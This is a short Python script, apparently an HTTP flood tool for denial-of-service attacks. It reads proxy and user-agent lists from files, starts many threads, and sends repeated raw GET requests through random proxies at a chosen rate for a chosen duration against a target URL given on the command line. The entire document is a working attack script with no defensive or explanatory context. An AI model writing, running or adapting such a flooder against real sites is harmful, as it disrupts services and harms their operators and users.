import requests
import threading
import time
import random
import sys
import socket

def attack(url, duration, rps, thread):
    proxies = []
    with open("proxstars.txt", "r") as f:
        for line in f:
            proxies.append(line.strip())
    user_agents = []
    with open("uastaro.txt", "r") as f:
        for line in f:
            user_agents.append(line.strip())
    threads = []
    for _ in range(thread):
        t = threading.Thread(target=attack_thread, args=(url, duration, rps, proxies, user_agents))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
        
def attack_thread(url, duration, rps, proxies, user_agents):
    delay = 1 / rps
    start_time = time.time()
    while time.time() < start_time + duration:
        proxy = random.choice(proxies)
        user_agent = random.choice(user_agents)
        try:
            headers = {
                "User-Agent": user_agent,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": url,
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Cookie": "overpower=true"
            }

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((proxy, 80))
            s.sendall((f"GET {url} HTTP/1.1\r\nHost: {proxy}\r\nUser-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nReferer: {url}\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nCookie: overpower=true\r\n\r\n").encode())
            s.close()
        except:
            pass
        time.sleep(delay)
        
if __name__ == "__main__":
    url = sys.argv[1]
    duration = int(sys.argv[2])
    rps = int(sys.argv[3])
    thread = int(sys.argv[4])
    attack(url, duration, rps, thread)